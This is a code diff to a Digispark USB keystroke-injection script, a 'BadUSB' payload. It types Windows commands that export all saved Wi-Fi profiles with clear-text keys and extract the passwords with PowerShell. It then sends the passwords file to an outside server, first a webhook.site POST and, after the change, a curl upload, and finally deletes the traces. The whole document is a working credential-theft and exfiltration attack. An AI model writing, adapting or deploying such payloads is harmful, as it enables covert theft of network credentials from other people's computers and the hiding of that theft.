@@ -18,17 +18,17 @@ void loop() {
         {
         DigiKeyboard.sendKeyStroke(81);
         }
-    DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
+    DigiKeyboard.sendKeyStroke(KEY_ENTER); // Detach from scrolling
     DigiKeyboard.delay(100);
-    DigiKeyboard.println("cd %temp%"); //going to temporary dir
+    DigiKeyboard.println("cd %temp%"); // Temporary directory
     DigiKeyboard.delay(500);
-    DigiKeyboard.println("netsh wlan export profile key=clear"); //grabbing all the saved wifi passwd and saving them in temporary dir
+    DigiKeyboard.println("netsh wlan export profile key=clear"); // Grab all the saved WiFi passwords and saving in temperory directory
     DigiKeyboard.delay(500);
-    DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS"); //Extracting all password and saving them in Wi-Fi-Pass file in temporary dir
+    DigiKeyboard.println("powershell Select-String -Path Wi*.xml -Pattern 'keyMaterial' > Wi-Fi-PASS");
     DigiKeyboard.delay(500);
-    DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/[ADD-WEBHOOK-ADDRESS-HERE] -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
+    DigiKeyboard.println("curl -X POST [FILESERVER]/upload -F files=@Wi-Fi-PASS"); // Upload passwords file to server
     DigiKeyboard.delay(1000);
-    DigiKeyboard.println("del Wi-* /s /f /q"); //cleaning up all the mess
+    DigiKeyboard.println("del Wi-* /s /f /q"); // Clean up
     DigiKeyboard.delay(100);
     DigiKeyboard.println("exit");
     DigiKeyboard.delay(100);
